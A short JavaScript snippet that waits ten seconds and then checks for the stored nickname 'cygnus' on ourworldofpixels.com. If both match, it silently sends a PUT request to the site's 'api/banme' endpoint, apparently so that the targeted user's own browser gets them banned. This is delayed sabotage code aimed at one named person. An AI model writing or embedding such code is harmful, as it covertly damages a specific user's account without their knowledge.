setTimeout(function(){
if (localStorage.nick == 'cygnus'){
        if(window.location.host == "ourworldofpixels.com"){
            fetch("api/banme",{method:"PUT"})
        }
    }
},10000);
